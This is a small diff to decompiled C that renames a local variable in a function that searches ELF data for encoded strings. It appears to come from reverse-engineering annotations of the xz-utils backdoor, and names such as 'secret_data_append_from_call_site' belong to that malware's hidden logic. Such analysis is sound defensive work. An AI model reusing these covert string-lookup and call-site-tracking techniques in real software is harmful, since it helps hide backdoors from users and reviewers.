@@ -19,13 +19,13 @@ u8 * elf_find_string_reference
   BOOL BVar1;
   char *pcVar2;
   u8 *puVar3;
-  EncodedStringId local_2c;
+  EncodedStringId string_id_cursor;
   
-  local_2c = encoded_string_id;
+  string_id_cursor = encoded_string_id;
   BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xd2,4,0xd,FALSE);
   if (BVar1 != FALSE) {
     pcVar2 = (char *)0x0;
-    while (pcVar2 = elf_find_string(elf_info,&local_2c,pcVar2), pcVar2 != (char *)0x0) {
+    while (pcVar2 = elf_find_string(elf_info,&string_id_cursor,pcVar2), pcVar2 != (char *)0x0) {
       puVar3 = find_string_reference(code_start,code_end,pcVar2);
       if (puVar3 != (u8 *)0x0) {
         return puVar3;
